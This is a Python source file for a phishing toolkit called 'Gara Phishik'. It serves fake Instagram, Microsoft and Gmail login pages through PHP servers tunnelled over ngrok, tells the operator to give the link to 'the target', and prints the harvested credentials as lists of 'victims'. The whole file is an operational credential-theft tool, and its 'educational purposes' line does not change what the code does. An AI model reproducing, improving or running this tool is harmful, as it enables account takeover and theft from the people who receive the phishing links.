import pyfiglet
import time
import os

banner = pyfiglet.figlet_format("Gara Phishik")
print(banner)
time.sleep(1)
print("* Author: Azar Abdulla")
print("* Version 0.1 (first release)")
print("* Gara Phishik - Basic Phishing Toolkit")
print("* Use it for only educational purposes.")
print("")
if os.geteuid() != 0:
   print("*ALERT* Gara Phishik need superuser privileges. script with 'sudo'.")
   time.sleep(1)
   exit()

time.sleep(1)

#ig_start
ig_start_php = 'php -q -S localhost:1221 -t index/ig > /dev/null &'

#ms_start
ms_start_php = 'php -q -S localhost:1223 -t index/ms > /dev/null &'

#gm_start
gm_start_php = 'php -q -S localhost:1224 -t index/gm > /dev/null &'

#For starting NGROK server
ngr_ig = 'ngrok http 1221 > /dev/null &'
ngr_ms = 'ngrok http 1223 > /dev/null &'
ngr_gm = 'ngrok http 1224 > /dev/null &'

#Kill existing NGROK and PHP server
pkill = ("pkill ngrok")
pkill1 = ("pkill php")

console = input("phishik >> ")

try:

    while True:

        if console == "help":

           print("Commands list:")
           print("ig_start - Starts server with Instagram template page.")
           print("ms_start - Starts server with Microsoft template page.")
           print("gm_start - Starts server with Google Mail template page.")
           print("ngk_auth - Enter your ngrok authtoken, if you didn't it.")
           print("show_crd - Shows all saved credentials.")
           print("exit - End the session.")

           print("")
           console = input("phishik >> ")

        elif console == "ig_start":
           print("Server starting..")
           time.sleep(1)
           os.system(pkill)
           os.system(pkill1)
           time.sleep(2)
           print("You can find saved credentials in index/ig/ig_credentials.txt")
           time.sleep(5)
           os.system(ig_start_php)
           os.system(ngr_ig)
           time.sleep(2)
           print("Give this link to the target and wait for credentials:")
           os.system('sudo curl -s 127.0.0.1:4040/api/tunnels | grep -Eo "(https)://[a-zA-Z0-9./?=_%:-]*" | sort -u')
           console = input("phishik >> ")

        elif console == "ms_start":
           print("Server starting..")
           time.sleep(1)
           os.system(pkill)
           os.system(pkill1)
           time.sleep(2)
           print("You can find saved credentials in index/ms/ms_credentials.txt")
           time.sleep(2)
           os.system(ms_start_php)
           os.system(ngr_ms)
           time.sleep(2)
           print("Give this link to the target and wait for credentials:")
           os.system('sudo curl -s 127.0.0.1:4040/api/tunnels | grep -Eo "(https)://[a-zA-Z0-9./?=_%:-]*" | sort -u')
           console = input("phishik >> ")

        elif console == "gm_start":
           print("Server starting..")
           os.system(pkill)
           os.system(pkill1)
           time.sleep(2)
           print("You can find saved credentials in index/gm/gm_credentials.txt")
           os.system(gm_start_php)
           os.system(ngr_gm)
           time.sleep(2)
           print("Give this link to the target and wait for credentials:")
           os.system('sudo curl -s 127.0.0.1:4040/api/tunnels | grep -Eo "(https)://[a-zA-Z0-9./?=_%:-]*" | sort -u')
           console = input("phishik >> ")

        elif console == "ngk_auth":
           token = input("Enter a valid token >> ")
           if token and len(token) << 45:
              print("Please, enter a valid TOKEN!")
           else:
               print("Token saved successfully but you should be sure it is a valid token.")
               print("Blank input means you have entered token before, but if you didn't, enter a token.")
               console = input("phishik >> ")

        elif console == "show_crd":
           print("Instagram victims:")
           os.system("cat index/ig/ig_credentials.txt")
           print("Microsoft victims:")
           os.system("cat index/ms/ms_credentials.txt")
           print("Google Mail victims:")
           os.system("cat index/gm/gm_credentials.txt")
           console = input("phishik >> ")

        elif console == "exit":
           os.system(pkill)
           os.system(pkill1)
           print("Say goodbye to phishik..")
           time.sleep(1)
           exit()


        elif console == "clear":
            os.system('clear')
            console = input("phishik >> ")

        else:
           print("Enter a valid command!")
           print("")
           console = input("phishik >> ")

except KeyboardInterrupt:
    print("")
    print("Say goodbye to phishik..")
    time.sleep(1)